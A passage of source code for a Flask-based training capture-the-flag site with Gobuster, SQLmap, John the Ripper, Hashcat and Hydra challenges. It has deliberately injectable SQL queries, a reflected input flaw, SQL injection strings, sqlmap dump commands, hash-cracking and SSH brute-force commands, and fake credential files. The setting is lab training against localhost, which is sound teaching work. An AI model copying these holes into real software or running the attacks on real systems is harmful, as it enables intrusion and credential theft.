<p>You found the secret directory!</p>
<p>The flag is: <strong>{flag}</strong></p>
<p>But can you find the flag.txt file?</p>
<p><a href="/ctf/tool/gobuster/secret/flag.txt">→ Get flag.txt</a></p>
<p><a href="/">← Back</a></p>
</body>
</html>
""", 200, {'Content-Type': 'text/html'}

@app.route('/ctf/tool/gobuster/secret/flag.txt')
def gobuster_flag():
    """Hidden flag file"""
    flag = get_flag_for_tool('gobuster')
    return f"""Congratulations!

You successfully used Gobuster to discover this hidden directory and file!

Flag: {flag}

This proves you can use Gobuster for:
1. Directory brute-forcing
2. Hidden file discovery
3. Web server enumeration

Keep exploring!
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/gobuster/backup')
def gobuster_backup_dir():
    """Backup directory"""
    return """Backup Directory:
- database_2024_01_15.sql
- config_backup.bak
- users_export.csv
- www_backup.tar.gz
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/gobuster/backup/database_2024_01_15.sql')
def gobuster_db_backup():
    """Database backup"""
    return """-- Database Backup
-- Date: 2024-01-15

CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(100),
    email VARCHAR(100)
);

INSERT INTO users VALUES (1, 'admin', 'admin123', 'admin@company.com');
INSERT INTO users VALUES (2, 'john', 'password1', 'john@company.com');
INSERT INTO users VALUES (3, 'jane', 'qwerty', 'jane@company.com');
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/gobuster/hidden')
def gobuster_hidden():
    """Another hidden directory"""
    return """Hidden Directory:
This directory contains sensitive information.
- /hidden/config.txt
- /hidden/secrets.txt
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/gobuster/hidden/config.txt')
def gobuster_config():
    """Hidden config file"""
    return """# Configuration File
DB_HOST=localhost
DB_USER=root
DB_PASS=SuperSecret123!
API_KEY=sk_live_abcdef1234567890
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/gobuster/hidden/secrets.txt')
def gobuster_secrets():
    """Hidden secrets file"""
    return """Secret Information:
- WiFi Password: P@ssw0rd123!
- Admin Token: abc123def456
- Backup Key: key_1234567890
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/gobuster/private')
def gobuster_private():
    """Private directory"""
    return """Private Directory:
Access Restricted - Authorized Personnel Only
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/sqlmap')
def sqlmap_main():
    """SQLmap challenge main page"""
    return render_template_string('''<!DOCTYPE html>
<html>
<head>
    <title>SQLmap Challenge</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a2e; color: #fff; padding: 40px; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #e94560; text-align: center; }
        .info { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .code { background: #0f3460; padding: 15px; border-radius: 5px; font-family: monospace; margin: 10px 0; }
        .hint { background: #0a8754; padding: 15px; border-radius: 5px; }
        a { color: #e94560; }
        .nav { text-align: center; margin-top: 30px; }
        .target { background: #c81d4e; padding: 15px; border-radius: 5px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>SQLmap SQL Injection</h1>
        
        <div class="target">
            <h2>Target Login Page</h2>
            <p><a href="/ctf/tool/sqlmap/login" style="color: #fff; font-size: 1.2em;">Open SQLmap Target Login</a></p>
        </div>
        
        <div class="info">
            <h2>What is SQLmap?</h2>
            <p>SQLmap is an automated SQL injection and database takeover tool.</p>
        </div>
        
        <div class="info">
            <h2>Challenge</h2>
            <p>Use SQLmap to exploit SQL injection vulnerabilities and dump the database.</p>
            <p>Find the flag in the database!</p>
        </div>
        
        <div class="code">
            <strong>Step 1: Find databases</strong><br>
            sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/api?username=admin" --dbs<br>
            <br>
            <strong>Step 2: List tables</strong><br>
            sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/api?username=admin" -D vulnerable --tables<br>
            <br>
            <strong>Step 3: Dump flag table</strong><br>
            sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/api?username=admin" -D vulnerable -T flag --dump
        </div>
        
        <div class="hint">
            <strong>Tips:</strong><br>
            - Try SQL injection on login forms<br>
            - Check for UNION-based injection<br>
            - Look for blind SQL injection<br>
            - Dump the database to find the flag
        </div>
        
        <div class="nav">
            <a href="/">Dashboard</a> | <a href="/ctf/submit">Submit Flag</a>
        </div>
    </div>
</body>
</html>
''')

@app.route('/ctf/tool/sqlmap/login', methods=['GET', 'POST'])
def sqlmap_login():
    """SQLmap vulnerable login page"""
    message = ''
    msg_type = ''
    
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        import sqlite3
        conn = sqlite3.connect('/app/instance/vulnerable.db')
        cursor = conn.cursor()
        
        query = f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'"
        
        try:
            cursor.execute(query)
            result = cursor.fetchone()
            conn.close()
            
            if result:
                message = f'Welcome {username}!'
                msg_type = 'success'
            else:
                message = 'Invalid credentials!'
                msg_type = 'error'
        except Exception as e:
            conn.close()
            message = f'SQL Error: {str(e)}'
            msg_type = 'error'
    
    return render_template_string('''<!DOCTYPE html>
<html>
<head>
    <title>Employee Login - SQLmap Target</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a2e; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .login-box { background: #16213e; padding: 40px; border-radius: 10px; width: 400px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        h2 { text-align: center; color: #e94560; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #aaa; }
        input { width: 100%; padding: 12px; background: #0f3460; border: 1px solid #e94560; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #e94560; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #c81d4e; }
        .message { padding: 15px; margin: 20px 0; border-radius: 5px; text-align: center; }
        .success { background: #0a8754; }
        .error { background: #c81d4e; }
        .hint { background: #0f3460; padding: 15px; margin-top: 20px; border-radius: 5px; font-size: 0.9em; }
        .nav { text-align: center; margin-top: 20px; }
        .nav a { color: #e94560; margin: 0 15px; text-decoration: none; }
        .warning { background: #c81d4e; padding: 10px; margin-bottom: 20px; border-radius: 5px; text-align: center; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Employee Login</h2>
        
        <div class="warning">
            This login is vulnerable to SQL injection!
        </div>
        
        {% if message %}
        <div class="message {{ msg_type }}">{{ message }}</div>
        {% endif %}
        
        <form method="POST">
            <div class="form-group">
                <label>Username:</label>
                <input type="text" name="username" placeholder="Enter username">
            </div>
            <div class="form-group">
                <label>Password:</label>
                <input type="password" name="password" placeholder="Enter password">
            </div>
            <button type="submit">Login</button>
        </form>
        
        <div class="hint">
            <strong>SQLmap Challenge:</strong><br>
            1. Run: <code>sqlmap -u "http://localhost:5000/ctf/tool/sqlmap/login" --data="username=admin&password=test" --dbs</code><br>
            2. Dump users table<br>
            3. Find the flag in the database!
        </div>
        
        <div class="nav">
            <a href="/ctf/tool/sqlmap">Challenge</a>
            <a href="/">Dashboard</a>
        </div>
    </div>
</body>
</html>
''', message=message, msg_type=msg_type)

@app.route('/ctf/tool/sqlmap/search')
def sqlmap_search():
    """Vulnerable search endpoint"""
    username = request.args.get('username', '')
    
    import sqlite3
    conn = sqlite3.connect('/app/instance/vulnerable.db')
    cursor = conn.cursor()
    
    query = f"SELECT id, username, email FROM user WHERE username = '{username}'"
    
    try:
        cursor.execute(query)
        results = cursor.fetchall()
        conn.close()
        
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>Search Users</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a2e; color: #fff; padding: 40px; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #e94560; text-align: center; }
        .search { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
        input { padding: 10px; width: 300px; background: #0f3460; border: 1px solid #e94560; color: #fff; border-radius: 5px; }
        button { padding: 10px 20px; background: #e94560; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 10px; border: 1px solid #333; text-align: left; }
        th { background: #0f3460; }
        .code { background: #0f3460; padding: 15px; border-radius: 5px; font-family: monospace; margin: 10px 0; }
        .nav { text-align: center; margin-top: 30px; }
        .nav a { color: #e94560; margin: 0 15px; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Search Users</h1>
        
        <div class="search">
            <form method="GET">
                <input type="text" name="username" placeholder="Search by username" value="''' + username + '''">
                <button type="submit">Search</button>
            </form>
        </div>
        
        <div class="code">
            <strong>Try SQL injection:</strong><br>
            /ctf/tool/sqlmap/search?username=admin' OR '1'='1<br>
            /ctf/tool/sqlmap/search?username=admin' UNION SELECT null,null,null--
        </div>
        
        <h2>Results:</h2>
        <table>
            <tr><th>ID</th><th>Username</th><th>Email</th></tr>
'''
        
        for row in results:
            html += f'<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td></tr>'
        
        html += '''
        </table>
        
        <div class="nav">
            <a href="/ctf/tool/sqlmap">Challenge</a>
            <a href="/">Dashboard</a>
        </div>
    </div>
</body>
</html>
'''
        return html
        
    except Exception as e:
        conn.close()
        return f'SQL Error: {str(e)}', 500

@app.route('/ctf/tool/john')
def john_main():
    """John the Ripper challenge main page"""
    return render_template_string('''<!DOCTYPE html>
<html>
<head>
    <title>John the Ripper Challenge</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a2e; color: #fff; padding: 40px; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #e94560; text-align: center; }
        .info { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .code { background: #0f3460; padding: 15px; border-radius: 5px; font-family: monospace; margin: 10px 0; white-space: pre-wrap; }
        .hint { background: #0a8754; padding: 15px; border-radius: 5px; }
        .download { background: #c81d4e; padding: 15px; border-radius: 5px; margin: 20px 0; text-align: center; }
        .download a { color: #fff; font-size: 1.2em; text-decoration: none; font-weight: bold; }
        a { color: #e94560; }
        .nav { text-align: center; margin-top: 30px; }
        .step { background: #16213e; padding: 15px; border-radius: 10px; margin: 15px 0; border-left: 4px solid #e94560; }
        .step h3 { color: #e94560; margin-top: 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>John the Ripper Challenge</h1>
        
        <div class="download">
            <h3>Download Hash Files</h3>
            <a href="/ctf/tool/john/hash.txt" download>Download hash.txt</a><br><br>
            <a href="/ctf/tool/john/shadow.txt" download>Download shadow.txt</a>
        </div>
        
        <div class="info">
            <h2>What is John the Ripper?</h2>
            <p>John the Ripper is a password cracking tool that uses dictionary and brute-force attacks.</p>
        </div>
        
        <div class="step">
            <h3>Step 1: Download the hash file</h3>
            <p>Click the download button above to get hash.txt</p>
        </div>
        
        <div class="step">
            <h3>Step 2: Run John to crack the hash</h3>
            <div class="code">john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</div>
        </div>
        
        <div class="step">
            <h3>Step 3: View cracked passwords</h3>
            <div class="code">john --show --format=raw-md5 hash.txt</div>
        </div>
        
        <div class="step">
            <h3>Step 4: Get the flag!</h3>
            <p>After cracking, fetch the flag from the server:</p>
            <div class="code">curl http://localhost:5000/ctf/tool/john/flag.txt</div>
            <p style="margin-top: 10px; color: #e94560;"><strong>Or view it directly:</strong> <a href="/ctf/tool/john/flag.txt" style="color: #e94560;">Click here to get the flag</a></p>
        </div>
        
        <div class="hint">
            <strong>Quick Commands:</strong><br>
            <code>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code><br>
            <code>john --show --format=raw-md5 hash.txt</code><br>
            <code>curl http://localhost:5000/ctf/tool/john/flag.txt</code>
        </div>
        
        <div class="nav">
            <a href="/">Dashboard</a> | <a href="/ctf/submit">Submit Flag</a>
        </div>
    </div>
</body>
</html>
''')

@app.route('/ctf/tool/john/hash.txt')
def john_hash():
    """Downloadable hash file for John"""
    hash_content = """# CTF Password Hashes
# Format: user:hash
# Use: john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

admin:21232f297a57a5a743894a0e4a801fc3
user:5f4dcc3b5aa765d61d8327deb882cf99
test:cc03e747a6afbbcbf8be7668acfebee5
flag:327a6c4304ad5938eaf0efb6cc3e53dc
backup:e10adc3949ba59abbe56e057f20f883e
root:63a9f0ea7bb98050796b649e85481845
web:5d41402abc4b2a76b9719d911017c592
db:0d107d09f5bbe40cade3de5c71e9e9b7

# Crack all hashes to reveal the flag!
# The flag user's password is the key!
"""
    return hash_content, 200, {
        'Content-Type': 'text/plain',
        'Content-Disposition': 'attachment; filename=hash.txt'
    }

@app.route('/ctf/tool/john/flag.txt')
def john_flag_file():
    """Flag file revealed after cracking"""
    flag = get_flag_for_tool('john')
    return f"""Congratulations!

You successfully cracked the password hashes!

The flag user's password was: flag

Flag: {flag}

This proves you can use John the Ripper to:
1. Crack MD5 password hashes
2. Use wordlists for dictionary attacks
3. Recover lost or forgotten passwords

Remember: Strong passwords are essential for security!
""", 200, {'Content-Type': 'text/plain'}

@app.route('/etc/shadow')
def john_shadow():
    """Fake shadow file for John"""
    return """root:$6$xyz$hash1:18000:0:99999:7:::
admin:$6$abc$hash2:18000:0:99999:7:::
user:$6$def$hash3:18000:0:99999:7:::
test:$6$ghi$hash4:18000:0:99999:7:::
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/hashcat')
def hashcat_main():
    """Hashcat challenge main page"""
    return render_template_string('''<!DOCTYPE html>
<html>
<head>
    <title>Hashcat Challenge</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a2e; color: #fff; padding: 40px; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #e94560; text-align: center; }
        .info { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .code { background: #0f3460; padding: 15px; border-radius: 5px; font-family: monospace; margin: 10px 0; white-space: pre-wrap; }
        .hint { background: #0a8754; padding: 15px; border-radius: 5px; }
        .download { background: #c81d4e; padding: 15px; border-radius: 5px; margin: 20px 0; text-align: center; }
        .download a { color: #fff; font-size: 1.2em; text-decoration: none; font-weight: bold; }
        a { color: #e94560; }
        .nav { text-align: center; margin-top: 30px; }
        .step { background: #16213e; padding: 15px; border-radius: 10px; margin: 15px 0; border-left: 4px solid #e94560; }
        .step h3 { color: #e94560; margin-top: 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Hashcat Challenge</h1>
        
        <div class="download">
            <h3>Download Hash Files</h3>
            <a href="/ctf/tool/hashcat/hashes.txt" download>Download hashes.txt</a><br><br>
            <a href="/ctf/tool/hashcat/md5_hashes.txt" download>Download md5_hashes.txt</a>
        </div>
        
        <div class="info">
            <h2>What is Hashcat?</h2>
            <p>Hashcat is a GPU-accelerated password cracking tool that supports many hash types.</p>
        </div>
        
        <div class="step">
            <h3>Step 1: Download the hash file</h3>
            <p>Click the download button above to get hashes.txt</p>
        </div>
        
        <div class="step">
            <h3>Step 2: Identify the hash type</h3>
            <div class="code"># Hash type 0 = MD5
# Hash type 1000 = NTLM
# Hash type 3200 = bcrypt</div>
        </div>
        
        <div class="step">
            <h3>Step 3: Run Hashcat to crack MD5 hashes</h3>
            <div class="code">hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</div>
        </div>
        
        <div class="step">
            <h3>Step 4: View cracked passwords</h3>
            <div class="code">hashcat -m 0 hashes.txt --show</div>
        </div>
        
        <div class="step">
            <h3>Step 5: Get the flag!</h3>
            <p>After cracking, fetch the flag from the server:</p>
            <div class="code">curl http://localhost:5000/ctf/tool/hashcat/flag.txt</div>
            <p style="margin-top: 10px; color: #e94560;"><strong>Or click here:</strong> <a href="/ctf/tool/hashcat/flag.txt" style="color: #e94560;">Get Flag</a></p>
        </div>
        
        <div class="hint">
            <strong>Quick Commands:</strong><br>
            <code>hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</code><br>
            <code>hashcat -m 0 hashes.txt --show</code><br>
            <code>curl http://localhost:5000/ctf/tool/hashcat/flag.txt</code>
        </div>
        
        <div class="hint">
            <strong>Hash Types:</strong><br>
            -m 0 = MD5<br>
            -m 100 = SHA1<br>
            -m 1000 = NTLM<br>
            -a 0 = Dictionary attack<br>
            -a 3 = Brute force
        </div>
        
        <div class="nav">
            <a href="/">Dashboard</a> | <a href="/ctf/submit">Submit Flag</a>
        </div>
    </div>
</body>
</html>
''')

@app.route('/ctf/tool/hashcat/hashes.txt')
def hashcat_hashes():
    """Downloadable hash file for Hashcat"""
    hash_content = """# CTF Password Hashes for Hashcat
# Hash Type: MD5 (-m 0)
# Format: hash:password

# MD5 hashes to crack
21232f297a57a5a743894a0e4a801fc3:admin
5f4dcc3b5aa765d61d8327deb882cf99:password
cc03e747a6afbbcbf8be7668acfebee5:test123
327a6c4304ad5938eaf0efb6cc3e53dc:flag
e10adc3949ba59abbe56e057f20f883e:123456
63a9f0ea7bb98050796b649e85481845:love
5d41402abc4b2a76b9719d911017c592:hello

# Crack all hashes to reveal the flag!
# The 'flag' hash contains the key!
"""
    return hash_content, 200, {
        'Content-Type': 'text/plain',
        'Content-Disposition': 'attachment; filename=hashes.txt'
    }

@app.route('/ctf/tool/hashcat/md5_hashes.txt')
def hashcat_md5():
    """Downloadable MD5 hash file"""
    return """# MD5 Hashes only (no usernames)
21232f297a57a5a743894a0e4a801fc3
5f4dcc3b5aa765d61d8327deb882cf99
cc03e747a6afbbcbf8be7668acfebee5
327a6c4304ad5938eaf0efb6cc3e53dc
e10adc3949ba59abbe56e057f20f883e
""", 200, {
        'Content-Type': 'text/plain',
        'Content-Disposition': 'attachment; filename=md5_hashes.txt'
    }

@app.route('/ctf/tool/hashcat/flag.txt')
def hashcat_flag_file():
    """Flag file revealed after cracking"""
    flag = get_flag_for_tool('hashcat')
    return f"""Congratulations!

You successfully cracked the password hashes with Hashcat!

The flag hash cracked to: flag

Flag: {flag}

This proves you can use Hashcat to:
1. Crack MD5 password hashes
2. Use GPU acceleration for faster cracking
3. Use wordlists for dictionary attacks

Remember: Strong passwords are essential for security!
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/hydra')
def hydra_main():
    """Hydra SSH challenge main page"""
    return render_template_string('''<!DOCTYPE html>
<html>
<head>
    <title>CYBERDEMONS RAID ROOM</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Share Tech Mono', monospace;
            background: #0a0a0f;
            color: #e0e0e0;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                linear-gradient(90deg, transparent 98%, rgba(0, 255, 255, 0.03) 100%),
                linear-gradient(0deg, transparent 98%, rgba(255, 0, 255, 0.03) 100%);
            background-size: 50px 50px;
            pointer-events: none;
            z-index: 1;
        }
        
        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 0, 0, 0.15),
                rgba(0, 0, 0, 0.15) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            z-index: 2;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 40px 20px;
            position: relative;
            z-index: 3;
        }
        
        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 3em;
            font-weight: 900;
            text-align: center;
            color: #ff00ff;
            text-shadow: 
                0 0 10px #ff00ff,
                0 0 20px #ff00ff,
                0 0 40px #ff00ff,
                0 0 80px #ff00ff;
            margin-bottom: 10px;
            animation: glitch 2s infinite;
            letter-spacing: 4px;
        }
        
        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(2px, -2px); }
            60% { transform: translate(-1px, -1px); }
            80% { transform: translate(1px, 1px); }
        }
        
        .subtitle {
            text-align: center;
            color: #00ffff;
            font-size: 1.2em;
            margin-bottom: 40px;
            text-shadow: 0 0 10px #00ffff;
            animation: pulse 1.5s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
        
        .target {
            background: linear-gradient(135deg, #1a0a2e 0%, #0d1b2a 100%);
            border: 2px solid #ff00ff;
            border-radius: 15px;
            padding: 30px;
            margin: 30px 0;
            text-align: center;
            box-shadow: 
                0 0 20px rgba(255, 0, 255, 0.3),
                inset 0 0 30px rgba(255, 0, 255, 0.1);
            position: relative;
            overflow: hidden;
        }
        
        .target::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, #ff00ff, transparent, #00ffff, transparent);
            animation: rotate 4s linear infinite;
            opacity: 0.1;
        }
        
        @keyframes rotate {
            100% { transform: rotate(360deg); }
        }
        
        .target h2 {
            font-family: 'Orbitron', sans-serif;
            color: #00ffff;
            font-size: 1.8em;
            text-shadow: 0 0 15px #00ffff;
            margin-bottom: 20px;
            position: relative;
        }
        
        .target p {
            font-size: 1.1em;
            margin: 10px 0;
            position: relative;
        }
        
        .target strong {
            color: #ff00ff;
            text-shadow: 0 0 5px #ff00ff;
        }
        
        .download {
            background: linear-gradient(135deg, #2d0a0a 0%, #1a0a2e 100%);
            border: 2px solid #ff3366;
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
            text-align: center;
            box-shadow: 0 0 20px rgba(255, 51, 102, 0.3);
        }
        
        .download h3 {
            font-family: 'Orbitron', sans-serif;
            color: #ff3366;
            font-size: 1.4em;
            text-shadow: 0 0 10px #ff3366;
            margin-bottom: 15px;
        }
        
        .download a {
            color: #00ff00;
            font-size: 1.2em;
            text-decoration: none;
            padding: 10px 20px;
            border: 1px solid #00ff00;
            border-radius: 5px;
            margin: 5px;
            display: inline-block;
            transition: all 0.3s;
            text-shadow: 0 0 5px #00ff00;
        }
        
        .download a:hover {
            background: #00ff00;
            color: #0a0a0f;
            box-shadow: 0 0 30px #00ff00;
        }
        
        .info {
            background: linear-gradient(135deg, #0a1a2e 0%, #1a0a2e 100%);
            border: 2px solid #00ffff;
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }
        
        .info h2 {
            font-family: 'Orbitron', sans-serif;
            color: #00ffff;
            font-size: 1.5em;
            text-shadow: 0 0 10px #00ffff;
            margin-bottom: 15px;
        }
        
        .info p {
            line-height: 1.6;
        }
        
        .step {
            background: linear-gradient(135deg, #0d1b2a 0%, #1a0a2e 100%);
            border: 2px solid #ffff00;
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            border-left: 5px solid #ff00ff;
            box-shadow: 0 0 15px rgba(255, 255, 0, 0.2);
            position: relative;
        }
        
        .step::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, rgba(255, 0, 255, 0.05) 0%, transparent 100%);
            border-radius: 15px;
            pointer-events: none;
        }
        
        .step h3 {
            font-family: 'Orbitron', sans-serif;
            color: #ffff00;
            font-size: 1.3em;
            text-shadow: 0 0 10px #ffff00;
            margin-bottom: 15px;
        }
        
        .code {
            background: #0a0a0f;
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 1.1em;
            color: #00ff00;
            text-shadow: 0 0 5px #00ff00;
            white-space: pre-wrap;
            margin: 15px 0;
            box-shadow: 
                0 0 10px rgba(0, 255, 0, 0.2),
                inset 0 0 20px rgba(0, 255, 0, 0.05);
            position: relative;
            overflow: hidden;
        }
        
        .code::before {
            content: 'root@cyberdemons:~# ';
            color: #ff00ff;
            text-shadow: 0 0 5px #ff00ff;
        }
        
        .hint {
            background: linear-gradient(135deg, #0a2e1a 0%, #0a1a2e 100%);
            border: 2px solid #00ff00;
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
        
        .hint strong {
            color: #00ff00;
            font-size: 1.2em;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .hint code {
            background: #0a0a0f;
            padding: 3px 8px;
            border-radius: 3px;
            color: #ffff00;
            border: 1px solid #ffff00;
        }
        
        .nav {
            text-align: center;
            margin-top: 50px;
            padding-top: 30px;
            border-top: 2px solid #ff00ff;
        }
        
        .nav a {
            color: #ff00ff;
            font-family: 'Orbitron', sans-serif;
            font-size: 1.1em;
            text-decoration: none;
            padding: 15px 30px;
            border: 2px solid #ff00ff;
            border-radius: 10px;
            margin: 10px;
            display: inline-block;
            transition: all 0.3s;
            text-shadow: 0 0 5px #ff00ff;
        }
        
        .nav a:hover {
            background: #ff00ff;
            color: #0a0a0f;
            box-shadow: 0 0 30px #ff00ff;
            transform: scale(1.05);
        }
        
        .cyber-border {
            position: relative;
            padding: 20px;
        }
        
        .cyber-border::before,
        .cyber-border::after {
            content: '';
            position: absolute;
            width: 50px;
            height: 50px;
            border: 2px solid #ff00ff;
        }
        
        .cyber-border::before {
            top: -10px;
            left: -10px;
            border-right: none;
            border-bottom: none;
        }
        
        .cyber-border::after {
            bottom: -10px;
            right: -10px;
            border-left: none;
            border-top: none;
        }
    </style>
</head>
<body>
    <div class="scanline"></div>
    <div class="container">
        <h1>CYBERDEMONS RAID ROOM</h1>
        <div class="subtitle">SSH Brute Force Challenge</div>
        
        <div class="target cyber-border">
            <h2>Target: SSH Service</h2>
            <p>Host: <strong>127.0.0.1</strong> (Metasploitable)</p>
            <p>Port: <strong>2223</strong></p>
            <p>Username: <strong>msfadmin</strong></p>
        </div>
        
        <div class="download">
            <h3>Download Wordlists</h3>
            <a href="/ctf/tool/hydra/passwords.txt" download>passwords.txt</a>
            <a href="/ctf/tool/hydra/users.txt" download>users.txt</a>
        </div>
        
        <div class="info">
            <h2>What is Hydra?</h2>
            <p>Hydra is a brute-force cracking tool that supports many protocols (SSH, FTP, HTTP, etc.). It can crack passwords by trying thousands of combinations per second.</p>
        </div>
        
        <div class="step">
            <h3>Step 1: Test SSH connection</h3>
            <div class="code">ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@127.0.0.1 -p 2223</div>
        </div>
        
        <div class="step">
            <h3>Step 2: Download the password list</h3>
            <div class="code">wget http://localhost:5000/ctf/tool/hydra/passwords.txt</div>
        </div>
        
        <div class="step">
            <h3>Step 3: Run Hydra brute force</h3>
            <div class="code">hydra -l msfadmin -P passwords.txt ssh://127.0.0.1:2223</div>
        </div>
        
        <div class="step">
            <h3>Step 4: Get the flag!</h3>
            <p>After cracking, fetch the flag from the server:</p>
            <div class="code">curl http://localhost:5000/ctf/tool/hydra/flag.txt</div>
            <p style="margin-top: 15px; color: #00ffff; font-size: 1.1em;">Or click here: <a href="/ctf/tool/hydra/flag.txt" style="color: #ff00ff; text-decoration: none; border-bottom: 2px solid #ff00ff;">Get Flag</a></p>
        </div>
        
        <div class="hint">
            <strong>Quick Commands:</strong><br><br>
            <code>wget http://localhost:5000/ctf/tool/hydra/passwords.txt</code><br><br>
            <code>hydra -l msfadmin -P passwords.txt ssh://127.0.0.1:2223</code><br><br>
            <code>curl http://localhost:5000/ctf/tool/hydra/flag.txt</code>
        </div>
        
        <div class="nav">
            <a href="/">Dashboard</a>
            <a href="/ctf/submit">Submit Flag</a>
        </div>
    </div>
</body>
</html>
''')

@app.route('/ctf/tool/hydra/passwords.txt')
def hydra_passwords():
    """Downloadable password list for Hydra"""
    return """password
123456
12345678
qwerty
abc123
monkey
1234567
letmein
trustno1
dragon
baseball
iloveyou
master
sunshine
ashley
bailey
passw0rd
shadow
123123
654321
superman
qazwsx
michael
football
password1
password123
msfadmin
admin
root
toor
""", 200, {
        'Content-Type': 'text/plain',
        'Content-Disposition': 'attachment; filename=passwords.txt'
    }

@app.route('/ctf/tool/hydra/users.txt')
def hydra_users():
    """Downloadable user list for Hydra"""
    return """root
admin
msfadmin
user
test
guest
oracle
postgresql
mysql
ftp
ssh
""", 200, {
        'Content-Type': 'text/plain',
        'Content-Disposition': 'attachment; filename=users.txt'
    }

@app.route('/ctf/tool/hydra/flag.txt')
def hydra_flag():
    """Hydra challenge flag"""
    return """FLAG{ssh_brut3_f0rc3d}""", 200, {
        'Content-Type': 'text/plain'
    }

@app.route('/ctf/tool/metasploit')
def metasploit_main():
    """Metasploit vsftpd backdoor challenge"""
    return render_template_string('''<!DOCTYPE html>
<html>
<head>
    <title>Metasploit FTP Backdoor</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Share Tech Mono', monospace;
            background: #0a0a0f;
            color: #e0e0e0;
            min-height: 100vh;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: 
                linear-gradient(90deg, transparent 98%, rgba(0,255,255,0.03) 100%),
                linear-gradient(0deg, transparent 98%, rgba(255,0,255,0.03) 100%);
            background-size: 50px 50px;
            pointer-events: none; z-index: 1;
        }
        .scanline {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
